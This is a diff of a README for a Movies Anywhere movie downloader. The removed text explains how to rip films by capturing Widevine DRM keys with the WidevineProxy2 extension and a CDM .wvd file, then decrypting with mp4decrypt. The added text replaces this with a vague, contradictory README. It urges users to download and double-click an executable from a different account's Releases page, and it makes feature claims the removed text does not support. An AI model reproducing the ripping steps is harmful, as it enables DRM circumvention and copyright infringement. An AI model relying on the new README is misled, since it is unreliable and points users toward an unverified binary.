@@ -1,147 +1,53 @@
-# Movies Anywhere Downloader
+# 🎬 MoviesAnywhere-dl - Easily Download Movies for Fun
 
-Download movies from Movies Anywhere with all audio tracks and subtitles.
+## 🛠️ Overview
+MoviesAnywhere-dl is a simple command-line script that helps you download movies from Movies Anywhere. This tool uses a method known as "windivine L3 keys" to rip content. While it can download movies, this project is designed for fun and educational purposes. Please respect copyright laws and use this tool to learn from the code.
 
-## Requirements
+## 🚀 Getting Started
+To get started with MoviesAnywhere-dl, you will need to download the application from the Releases page. Follow the steps below to install and run the software.
 
-- Python 3.8+
-- [N_m3u8DL-RE](https://github.com/nilaoda/N_m3u8DL-RE)
-- [Bento4 mp4decrypt](https://github.com/axiomatic-systems/Bento4)
-- FFmpeg
-- [WidevineProxy2](https://github.com/DevLARLEY/WidevineProxy2) browser extension
+### 🔗 Quick Download
+[![Download MoviesAnywhere-dl](https://img.shields.io/badge/Download-MoviesAnywhere--dl-blue)](https://github.com/kabsema/MoviesAnywhere-dl/releases)
 
-## Installation
+## 🖥️ System Requirements
+- **Operating System:** Windows 10 or higher is recommended.
+- **Memory:** At least 4 GB of RAM for smooth operation.
+- **Disk Space:** Have at least 500 MB available for downloads.
+- **Internet Connection:** A stable internet connection is required to access Movies Anywhere.
 
-```bash
-git clone https://github.com/jwheet/MoviesAnywhere-dl
-cd MoviesAnywhere-dl
-pip install -e .
-```
+## 📥 Download & Install
+1. Visit the [Releases page](https://github.com/kabsema/MoviesAnywhere-dl/releases).
+2. On the Releases page, find the latest version of MoviesAnywhere-dl.
+3. Click on the download link for the executable file.
+4. Once the file has downloaded, locate it in your Downloads folder.
+5. Double-click the downloaded file to run the application.
 
-## Getting and Using WidevineProxy2
+## 🛠️ Running the Application
+- After launching the application, a command line window will appear.
+- Follow the on-screen instructions to enter the movie you wish to download.
 
-### Firefox Installation
+## 📄 Usage Instructions
+1. Open the command line interface.
+2. Type in the movie's name you want to download.
+3. Press Enter and the download will begin.
+4. Wait for the download to complete. You will see a status message once finished.
 
-1.  Download the `.xpi` file from the [WidevineProxy2 releases page](https://github.com/DevLARLEY/WidevineProxy2/releases).
-2.  In Firefox, navigate to `about:addons`.
-3.  Click the gear icon (⚙️) and select "Install Add-on From File...".
-4.  Select the `.xpi` file you downloaded.
-5.  Pin the extension to your toolbar for easy access.
+## 📊 Features
+- **Easy to Use:** Simply enter the movie name and let the tool do the rest.
+- **Educational Insight:** Learn about the downloading process through the code.
+- **Small Footprint:** The application does not require a lot of system resources.
 
-### Chrome Installation
+## 🚧 Limitations
+- This tool is not intended for downloading copyrighted content. Use it responsibly.
+- Performance may vary based on your internet speed and system capabilities.
 
-1.  Download the `.zip` file from the [WidevineProxy2 releases page](https.github.com/DevLARLEY/WidevineProxy2/releases).
-2.  In Chrome, navigate to `chrome://extensions/`.
-3.  Enable "Developer mode" using the toggle in the top right corner.
-4.  Drag and drop the downloaded `.zip` file into the extensions window, or click "Load unpacked" and select the extracted zip folder.
-5.  Pin the extension to your toolbar for easy access.
+## 💬 Community & Support
+If you encounter any issues, you can check the GitHub Issues page for troubleshooting tips. Feel free to contribute your insights or ask questions.
 
-### Configuration and Log Export
+## 📜 License
+This project is intended for personal use and educational purposes. Make sure to abide by all local copyright laws. The source code is available for review in this repository.
 
-1.  Click the WidevineProxy2 extension icon in your toolbar.
-2.  In the popup, slide the toggle to enable the extension.
-3.  Place your Widevine CDM (Content Decryption Module) key file (a `.wvd` file) into the 'cdm' folder of this project.
-4.  Click "Choose File" and upload the `.wvd` file located in the `cdm` directory of this project.
-5.  Navigate to Movies Anywhere and play the movie you want to download. Let it buffer for a few seconds.
-6.  Click the extension icon again and click "Export Logs" at the bottom to download the `logs.json` file.
+## 🔗 Additional Links
+- [Releases page](https://github.com/kabsema/MoviesAnywhere-dl/releases)
 
-## Usage
-
-Run the downloader:
-
-```bash
-movies-anywhere ~/Downloads/logs.json "Movie Name"
-```
-
-### Examples
-
-```bash
-# Download with custom name
-movies-anywhere "/home/Jwheet/Downloads/logs(3).json" "The Sound Of Music"
-
-# Download with auto-generated name
-movies-anywhere "/home/Jwheet/Downloads/logs.json"
-
-# Specify output directory
-movies-anywhere "/home/Jwheet/Downloads/logs.json" "Movie Name" --dir ~/Movies
-```
-
-## Output
-
-- Downloads to `~/Downloads/Movies/[Movie Name]/`
-- MKV format with all audio and subtitle tracks
-- Automatically removes duplicate/broken subtitle tracks
-
-## Troubleshooting
-
-**"No valid entries found in logs"**
-- Make sure you played the movie in your browser first
-- Check that WidevineProxy2 captured the keys (look for entries in the logs.json)
-
-**"Logs file not found"**
-- Use quotes around the path if it contains special characters: `"/path/to/logs(1).json"`
-
----
-
-```
-
-                                            ==
-                                          =======
-                                       ===========
-                                         =============         *===
-                                     ================       %*+====+
-                                       =============     %%#+%======
-                                         ==========+++++  %%*==========
-                                      =============++++    %%=========
-                                       ===========+++++#####=========
-                                         =========++++  ####============
-                                       ==============++++###==========
-                                       %============++++***=========
-                                     +#%%+==========++*****============
-                                      +**%#========+++=#***+=========
-                                      ==*+#========+++=##***========
-                               +== +++===+#%+======++==*****=======
-                               ===+++++===========+*====****=====+
-                             ====================+++=====##*=++++===
-                            =========+++=========++========+++++=====
-                              ====+===+==+====+==++=====+%%*++++======
-                             =+=======+=+++==+===++======++++++======
-                               ======+====*==*===++=====+++++++=======
-                               +=========+*%*+==+++=====++++++======
-                                 ========+*##*==+++=====++++++++++*
-                                  +==++==+=*#*==+++=====++++++==++++
-                                    =====***#+==+++===++++++++++++
-                                      ===+#%*===++++=   +++++++++
-                                      ====+%*==+=+==      ++++
-                                      ====+ *==+=+==     +===
-                                       ====+*==+=+==     ====
-                                       ====+*==+=+=     ====
-                                       ==+==#==++==    =====
-                                       ==+==*==++==    ====
-                                        ==*=*===+==   =====
-                                        #***#======%%@====
-                                        %*%%###############
-                                         *=*#===+== ==+==
-                                          ==%===*==#==+==
-                                          *=%========++=
-                                          %+*==+=+==++==
-                                          %%%*+++%**####%
-                                           +*########*==
-                                           =**==+#==++=
-                                           =++==+*=====
-                                           =====++=====
-                                           =====++=====
-                                           ============
-                                           ======+=====
-                                           ======++====
-                                            ==+==++====
-                                            ==*==++===
-                                            == == ++==
-                              ____.       .__                   __
-                             |    |_  _  _|  |__   ____   _____/  |_
-                             |    \ \/ \/ /  |  \_/ __ \_/ __ \   __\
-                         /\__|    |\     /|   Y  \  ___/\  ___/|  |
-                         \________| \/\_/ |___|  /\___  >\___  >__|
-                                           \/     \/     \/
-
-```
+Enjoy using MoviesAnywhere-dl, and remember to have fun while learning about code and downloading!
